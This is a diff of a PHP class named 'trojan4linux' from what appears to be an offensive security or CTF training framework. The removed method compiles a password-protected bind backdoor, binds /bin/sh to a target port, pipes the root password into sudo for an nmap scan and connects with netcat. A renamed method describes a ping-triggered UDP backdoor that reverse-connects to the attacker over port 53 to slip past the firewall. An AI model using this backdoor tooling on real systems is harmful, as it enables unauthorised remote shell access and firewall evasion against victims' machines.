@@ -17,22 +17,10 @@ class trojan4linux extends inject4linux{
     // https://kalilinuxtutorials.com/cymothoa/
     // https://blog.barradell-johns.com/index.php/2018/09/04/pinkys-palace-v3-writeup/
     
-    public function trojan4linux_password($password){
-        $this->ssTitre("Backdoor Bind on $this->target_port with Password access; '$password' " );
-        $this->requette("cp -v  $this->dir_c/backdoor_with_password.c $this->dir_tmp/backdoor_with_password.c" );
-        $this->requette("gedit $this->dir_tmp/backdoor_with_password.c" );
-        $file_c = new FILE("$this->dir_tmp/backdoor_with_password.c");
-        $file_elf = $file_c->file_c2elf("");
-        $elf = new bin4linux($file_elf);
-        //$this->requette("gcc  $this->dir_c/backdoor_with_password.c -o $this->dir_tmp/backdoor_with_password  2>/dev/null" );
-        $cmd1 = "$elf->file_path /bin/sh $this->target_port $password ";
-        $cmd2 = "echo '$this->root_passwd' | sudo -S nmap -sS -p $this->target_port --reason -v $this->target_ip && nc $this->target_ip $this->target_port -v " ;
-        $this->exec_parallel($cmd1, $cmd2, 2);
-        $this->pause();
-    }
+
     
     
-    public function trojan4linux_ping(){
+    public function root2trojan_ping(){
         $this->ssTitre("Backdoor UDP qui s'active lors d'un ping et se reverse connexion vers l'attaquant sur le port 2323" );
         $this->important("Port 53 UDP -> sortir a travers le firewall" );
         $ub = new vm($this->target_vmx_name);
